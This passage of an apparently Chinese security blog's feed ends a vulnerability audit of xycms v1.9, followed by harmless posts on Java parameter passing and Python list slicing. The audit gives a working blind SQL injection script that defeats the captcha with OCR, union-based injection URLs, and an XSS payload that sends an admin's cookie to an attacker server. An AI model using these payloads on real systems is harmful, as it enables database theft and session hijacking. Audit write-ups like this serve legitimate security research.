class="attribute">Cookie</span>: PHPSESSID=npvaign44srcvlhjglh9srrqo6</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">X-Forwarded-For</span>: 1' and case when (ascii(mid((database()),1,1))&lt;127) then (sleep(5)) else (1) end and '</span><br><span class="line"></span><br><span class="line">admin=1&amp;password=1&amp;checkcode=4K23</span><br></pre></td></tr></table></figure><p>也就是说，我们只要能正确识别验证码，<code>X-Forwarded-For</code>中提交盲注的内容，就可以进行sql注入</p><p>注入数据库名的<code>exp.py</code></p><p>这里必须要安装<code>pytesseract库</code>和<code>tesseract</code>，这样的话ocr识别很快</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">r = requests.Session()</span><br><span class="line">url_code = <span class="string">'http://localhost:81/system/code.php?act=yes'</span></span><br><span class="line">url_login = <span class="string">'http://localhost:81/system/loginpass.php'</span></span><br><span class="line">length = <span class="string">''</span></span><br><span class="line">name = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里获取验证码，并将原图转为灰度图像，然后再指定二值化的阈值</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">code</span><span class="params">()</span>:</span></span><br><span class="line">    req = r.get(url_code)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'1.png'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(req.content)</span><br><span class="line">    <span class="comment">#新建Image对象</span></span><br><span class="line">    image = Image.open(<span class="string">"1.png"</span>)</span><br><span class="line">    <span class="comment">#进行置灰处理</span></span><br><span class="line">    image = image.convert(<span class="string">'L'</span>)</span><br><span class="line">    <span class="comment">#这个是二值化阈值</span></span><br><span class="line">    threshold = <span class="number">150</span></span><br><span class="line">    table = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span>  range(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> i &lt; threshold:</span><br><span class="line">            table.append(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            table.append(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#通过表格转换成二进制图片，1的作用是白色，不然就全部黑色了</span></span><br><span class="line">    image = image.point(table,<span class="string">"1"</span>)</span><br><span class="line">    code = pytesseract.image_to_string(image)</span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里判断数据库名长度验证码是否正确，如果错误的话，递归提交，直到正确为止</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkcode_length</span><span class="params">(num2,num1=<span class="number">1</span>)</span>:</span></span><br><span class="line">    payload_length = <span class="string">"1' and case when (ascii(mid((length(database())),&#123;num1&#125;,1))=&#123;num2&#125;) then (sleep(3)) else (1) end and '"</span></span><br><span class="line">    data = &#123;<span class="string">'admin'</span>: <span class="string">'1'</span>,</span><br><span class="line">            <span class="string">'password'</span>: <span class="string">'1'</span>,</span><br><span class="line">            <span class="string">'checkcode'</span>: code()</span><br><span class="line">            &#125;</span><br><span class="line">    full_payload = payload_length.format(num1=str(num1),num2=str(num2))</span><br><span class="line">    print(full_payload)</span><br><span class="line">    req = r.post(url_login, data=data, headers=&#123;<span class="string">'X-Forwarded-For'</span>: full_payload&#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'验证码输入有误'</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        <span class="keyword">return</span> checkcode_length(num2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里判断数据库名验证码是否正确，如果错误的话，递归提交，直到正确为止</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkcode_database_name</span><span class="params">(num1,num2)</span>:</span></span><br><span class="line">    payload_database_name = <span class="string">"1' and case when (ascii(mid((database()),&#123;num1&#125;,1))&lt;&#123;num2&#125;) then (sleep(3)) else (1) end and '"</span></span><br><span class="line">    data = &#123;<span class="string">'admin'</span>: <span class="string">'1'</span>,</span><br><span class="line">            <span class="string">'password'</span>: <span class="string">'1'</span>,</span><br><span class="line">            <span class="string">'checkcode'</span>: code()</span><br><span class="line">            &#125;</span><br><span class="line">    full_payload = payload_database_name.format(num1=str(num1),num2=str(num2))</span><br><span class="line">    print(full_payload)</span><br><span class="line">    req = r.post(url_login, data=data, headers=&#123;<span class="string">'X-Forwarded-For'</span>: full_payload&#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'验证码输入有误'</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        <span class="keyword">return</span> checkcode_database_name(num1,num2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里返回数据库名的长度</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">database_length</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> length</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>,<span class="number">58</span>):</span><br><span class="line">        payload_length = <span class="string">"1' and case when (ascii(mid((length(database())),1,1))=&#123;num1&#125;) then (sleep(3)) else (1) end and '"</span></span><br><span class="line">        data = &#123;<span class="string">'admin'</span>: <span class="string">'1'</span>,</span><br><span class="line">                <span class="string">'password'</span>: <span class="string">'1'</span>,</span><br><span class="line">                <span class="string">'checkcode'</span>: code()</span><br><span class="line">                &#125;</span><br><span class="line">        full_payload = payload_length.format(num1=str(i))</span><br><span class="line">        print(full_payload)</span><br><span class="line">        start_time = time()</span><br><span class="line">        req = r.post(url_login, data=data, headers=&#123;<span class="string">'X-Forwarded-For'</span>: full_payload&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'验证码输入有误'</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            checkcode_length(str(i))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> time() - start_time &gt; <span class="number">2.5</span>:</span><br><span class="line">                length += chr(i)</span><br><span class="line">                print(length)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里调用database_length()函数来获取数据库名的长度</span></span><br><span class="line">database_length()</span><br><span class="line">print(length)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里返回数据库名</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">database_name</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> name</span><br><span class="line">    payload_database_name = <span class="string">"1' and case when (ascii(mid((database()),&#123;num1&#125;,1))&lt;&#123;num2&#125;) then (sleep(3)) else (1) end and '"</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,int(length)+<span class="number">1</span>):</span><br><span class="line">        left = <span class="number">32</span></span><br><span class="line">        right = <span class="number">127</span></span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            mid = (left + right) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> mid == left:</span><br><span class="line">                name += chr(mid)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            data = &#123;<span class="string">'admin'</span>: <span class="string">'1'</span>,</span><br><span class="line">                    <span class="string">'password'</span>: <span class="string">'1'</span>,</span><br><span class="line">                    <span class="string">'checkcode'</span>: code()</span><br><span class="line">                    &#125;</span><br><span class="line">            full_payload = payload_database_name.format(num1=str(i), num2=str(mid))</span><br><span class="line">            print(full_payload)</span><br><span class="line">            start_time = time()</span><br><span class="line">            req = r.post(url_login, data=data, headers=&#123;<span class="string">'X-Forwarded-For'</span>: full_payload&#125;)</span><br><span class="line">            print(full_payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'验证码输入有误'</span> <span class="keyword">in</span> req.text:</span><br><span class="line">                checkcode_database_name(i, mid)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> time() - start_time &gt; <span class="number">2.5</span>:</span><br><span class="line">                    right = mid</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    left = mid</span><br><span class="line">                    </span><br><span class="line"><span class="comment"># 这里调用database_name()函数来获取数据库名</span></span><br><span class="line">database_name()</span><br><span class="line">print(name)</span><br></pre></td></tr></table></figure><h2 id="第三处sql注入"><a href="#第三处sql注入" class="headerlink" title="第三处sql注入"></a>第三处sql注入</h2><p><code>/system/hf_book.php</code>关键代码如下,大概在这个页面的18行左右</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">....</span><br><span class="line">....</span><br><span class="line">....</span><br><span class="line">$sxid=$_GET[<span class="string">"id"</span>];</span><br><span class="line">$e_rs=$db-&gt;get_one(<span class="string">"select * from ***cms_book where id=$sxid"</span>,MYSQL_ASSOC);</span><br><span class="line">$bid=$e_rs[<span class="string">'id'</span>];</span><br><span class="line">....</span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>先猜测字段数目,11正确，12错误，说明字段数是11</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:81/CMS/***cms/system/hf_book.php?id=11 order by 11#</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:81/CMS/***cms/system/hf_book.php?id=11 order by 12#</span><br></pre></td></tr></table></figure><p><img src="http://images.xianyu123.club/20200408135511.png" alt="image-20200408135511457"></p><p><img src="http://images.xianyu123.club/20200408135556.png" alt="image-20200408135556111"></p><p>看回显部分，字段3和字段5存在回显</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:81/CMS/***cmcs/system/hf_book.php?id=11 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11#</span><br></pre></td></tr></table></figure><p><img src="http://images.xianyu123.club/20200408135648.png" alt="image-20200408135648088"></p><p>注入出数据库名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:81/CMS/***cms/system/hf_book.php?id=11 and 1=2 union select 1,2,database(),4,5,6,7,8,9,10,11#</span><br></pre></td></tr></table></figure><p><img src="http://images.xianyu123.club/20200408135739.png" alt="image-20200408135739867"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这里其实还有非常多的sql注入，包括insert注入，delete注入，update注入，由于文章篇幅的原因，没有一一例举。因为源头insert或者update或者delete没有做好过滤，导致了这篇漏洞，所以这里也就不再重复说明，举了几个比较典型的案例来说明</p><h1 id="前台存储型xss"><a href="#前台存储型xss" class="headerlink" title="前台存储型xss"></a>前台存储型xss</h1><p><code>/add_do.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">require</span> <span class="string">'Conf/***cms.inc.php'</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">'Libs/Function/fun.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(strtolower($_POST[<span class="string">"checkcode"</span>])==strtolower($_SESSION[<span class="string">"randval"</span>]))&#123;</span><br><span class="line">  <span class="keyword">unset</span>($_SESSION[<span class="string">"randval"</span>]);<span class="comment">//释放session中的变量</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">unset</span>($_SESSION[<span class="string">"randval"</span>]);</span><br><span class="line">  ok_info(<span class="number">0</span>,<span class="string">"验证码输入有误!"</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$byz=$_POST[<span class="string">'b_yzcode'</span>];</span><br><span class="line"><span class="keyword">if</span>($byz!==md5($yzcode))&#123;</span><br><span class="line">ok_info(<span class="number">0</span>,<span class="string">'错误的参数！'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$siteinfo = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'type_id'</span> =&gt; intval(trim($_POST[<span class="string">'type_id'</span>])),</span><br><span class="line"><span class="string">'b_title'</span> =&gt; injCheck($_POST[<span class="string">'b_title'</span>]),</span><br><span class="line"><span class="string">'b_content'</span> =&gt; injCheck($_POST[<span class="string">'b_content'</span>]),</span><br><span class="line"><span class="string">'b_name'</span> =&gt; injCheck($_POST[<span class="string">'b_name'</span>]),</span><br><span class="line"><span class="string">'b_tel'</span> =&gt; injCheck($_POST[<span class="string">'b_tel'</span>]),</span><br><span class="line"><span class="string">'b_mail'</span> =&gt; injCheck($_POST[<span class="string">'b_mail'</span>]),</span><br><span class="line"><span class="string">'b_qq'</span> =&gt; injCheck($_POST[<span class="string">'b_qq'</span>]),</span><br><span class="line"><span class="string">'b_ip'</span> =&gt; injCheck($_POST[<span class="string">'b_ip'</span>]),</span><br><span class="line"><span class="string">'c_date'</span> =&gt; time()</span><br><span class="line">);</span><br><span class="line">$db-&gt;insert(<span class="string">"***cms_book"</span>, $siteinfo);</span><br><span class="line">$db-&gt;close();</span><br><span class="line">ok_info(<span class="string">'/index.php'</span>,<span class="string">'恭喜你，留言提交成功！'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第17行到第24行，只对sql注入进行了过滤，并没有对xss过滤，导致了这些提交字段都存在xss漏洞</p><p>然后我们到该页面，进行提交</p><p><img src="http://images.xianyu123.club/20200408141210.jpeg" alt="xss2"></p><p>这里我是用我的服务器进行监听，<code>4.js</code>内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var image=new Image();</span><br><span class="line">image.src=&quot;http://你的vps-ip:10006/cookies.phpcookie=&quot;+document.cookie;</span><br></pre></td></tr></table></figure><p>然后在我自己的服务器上nc监听</p><p><img src="http://images.xianyu123.club/20200408141355.png" alt="xss3"></p><p>然后当管理员在后台点击访问新回复的时候</p><p><img src="http://images.xianyu123.club/20200408141657.jpeg" alt="xss1"></p><p>然后可以打到cookie并且可以成功登录</p><p><img src="http://images.xianyu123.club/20200408141925.jpeg" alt="xss5"></p><h2 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h2><p>其实这里也有后台存储型xss，但是很鸡肋，就不说了</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文首发于先知社区——&lt;a href=&quot;https://xz.aliyun.com/t/7557&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;xycms v1.9的一次审计&lt;/a&gt;，转载时请标明出处&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>java基本数据类型传递与引用传递区别的一些思考</title>
    <link href="http://0clickjacking0.github.io/2020/06/09/java%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E4%BC%A0%E9%80%92%E4%B8%8E%E5%BC%95%E7%94%A8%E4%BC%A0%E9%80%92%E5%8C%BA%E5%88%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"/>
    <id>http://0clickjacking0.github.io/2020/06/09/java基本数据类型传递与引用传递区别的一些思考/</id>
    <published>2020-06-09T03:01:51.000Z</published>
    <updated>2020-06-15T13:11:34.670Z</updated>
    
    <content type="html"><![CDATA[<p>java基本数据类型传递与引用传递区别的一些思考</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在学习java，刚好看到这一块内容，在网上看了很多文章之后，便有了今天这篇文章。</p><p>首先，java来说，java中<strong>只存在值传递</strong>，其实<strong>并不存在引用传递</strong>，因为java中没有指针。接下来我分<code>基本数据类型作为形参</code>、<code>引用类型（除了String类型）作为形参</code>、<code>String类型作为形参</code>来进行讲解</p><h1 id="🌰"><a href="#🌰" class="headerlink" title="🌰"></a>🌰</h1><h2 id="基本数据类型作为形参"><a href="#基本数据类型作为形参" class="headerlink" title="基本数据类型作为形参"></a>基本数据类型作为形参</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">a</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> a = <span class="number">1</span>;</span><br><span class="line">        System.out.println(<span class="string">"调用前x的值："</span>+a);</span><br><span class="line">        change(a);</span><br><span class="line">        System.out.println(<span class="string">"调用后x的值："</span>+a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">change</span><span class="params">(<span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">        b = b*<span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里应该输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">调用前x的值：1</span><br><span class="line">调用后x的值：1</span><br></pre></td></tr></table></figure><p>change方法执行的过程如下：</p><ol><li>将a的值复制给b</li><li>b = b *10</li><li>这个方法结束后，参数变量b不再使用，被回收</li></ol><p><img src="http://images.xianyu123.club/20200614211143.png" alt="image-20200614211143726"></p><h2 id="引用数据类型（除了String类型）作为形参"><a href="#引用数据类型（除了String类型）作为形参" class="headerlink" title="引用数据类型（除了String类型）作为形参"></a>引用数据类型（除了String类型）作为形参</h2><p>这里举一个数组的例子，其他引用类型（除了String类型）也是类似的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>&#125;;</span><br><span class="line">        System.out.println(arr[<span class="number">0</span>]);</span><br><span class="line">        change(arr);</span><br><span class="line">        System.out.println(arr[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">change</span><span class="params">(<span class="keyword">int</span>[] arr)</span> </span>&#123;</span><br><span class="line">        arr[<span class="number">0</span>] = <span class="number">200</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里应该输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">200</span><br></pre></td></tr></table></figure><p>change方法执行的过程如下：</p><ol><li>将变量arr的地址复制给形参arr，变量arr和形参arr指向的是同一个地址</li><li>形参arr修改索引0的值</li><li>这个方法结束后，形参arr不再使用，被释放。</li></ol><p><img src="http://images.xianyu123.club/20200615211123.png" alt="image-20200615211123172"></p><h2 id="String类型作为形参"><a href="#String类型作为形参" class="headerlink" title="String类型作为形参"></a>String类型作为形参</h2><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol><li><a href="https://blog.csdn.net/javazejian/article/details/51192130" target="_blank" rel="noopener">java基本数据类型传递与引用传递区别详解</a></li><li><a href="https://blog.csdn.net/cauchyweierstrass/article/details/49047217" target="_blank" rel="noopener">你真的理解Java的按引用传递吗？</a></li><li><a href="https://blog.csdn.net/qq_35923749/article/details/79703700" target="_blank" rel="noopener">java函数（方法）中的值传递和引用传递问题</a></li><li><a href="https://www.cnblogs.com/coderising/p/5697986.html" target="_blank" rel="noopener">java中的值传递和引用传递问题</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;java基本数据类型传递与引用传递区别的一些思考&lt;/p&gt;
    
    </summary>
    
      <category term="Java" scheme="http://0clickjacking0.github.io/categories/Java/"/>
    
    
  </entry>
  
  <entry>
    <title>python将一组数分成每几个一组的一些思考</title>
    <link href="http://0clickjacking0.github.io/2020/06/02/python%E5%B0%86%E4%B8%80%E7%BB%84%E6%95%B0%E5%88%86%E6%88%90%E6%AF%8F%E5%87%A0%E4%B8%AA%E4%B8%80%E7%BB%84%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83/"/>
    <id>http://0clickjacking0.github.io/2020/06/02/python将一组数分成每几个一组的一些思考/</id>
    <published>2020-06-02T11:54:18.000Z</published>
    <updated>2020-06-09T08:30:23.165Z</updated>
    
    <content type="html"><![CDATA[<p>python将一组数分成每几个一组的一些思考</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近用python写一个爬虫的时候，突然遇到一个问题：如何将一个list中的数字，分成每几个一组，便有了这篇文章</p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><h2 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>]</span><br><span class="line">b = []</span><br><span class="line">step = <span class="number">6</span> <span class="comment"># 这里是你选择的几个一组</span></span><br><span class="line">lens = math.ceil(len(a)/step)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,lens):</span><br><span class="line">    b.append(a[step*i:step*i+step])</span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure><h2 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h2><p>参考自<a href="https://blog.csdn.net/Mr_Cat123/article/details/80584988" target="_blank" rel="noopener">python将一组数分成每3个一组</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>]</span><br><span class="line">step = <span class="number">3</span></span><br><span class="line">b = [a[i:i+step] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(a),step)]</span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = [str(i) for i in b]</span><br></pre></td></tr></table></figure><p>等价于</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = []</span><br><span class="line">for i in b:</span><br><span class="line">    a.append(str(i))</span><br></pre></td></tr></table></figure><p>这是python中的列表生成式，更多的介绍可以google一下</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>其实这两种方法的思想都是一样的，本质上就是用切片取出想要数据的范围，只是方法1用了一个变量的动态范围，方法2用了<code>range()</code>函数的<code>step</code>参数，方法2看起来更加简洁明了</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol><li><a href="https://blog.csdn.net/Mr_Cat123/article/details/80584988" target="_blank" rel="noopener">python将一组数分成每3个一组</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;python将一组数分成每几个一组的一些思考&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="http://0clickjacking0.github.io/categories/Python/"/>
    
    
  </entry>
  
  <entry>
    <title>macos设置开机启动任务</title>
    <link href="http://0clickjacking0.github.io/2020/05/20/macos%E8%AE%BE%E7%BD%AE%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E4%BB%BB%E5%8A%A1/"/>
    <id>http://0clickjacking0.github.io/2020/05/20/macos设置开机启动任务/</id>
    <published>2020-05-20T01:57:15.000Z</published>
    <updated>2020-08-24T02:42:49.340Z</updated>
    
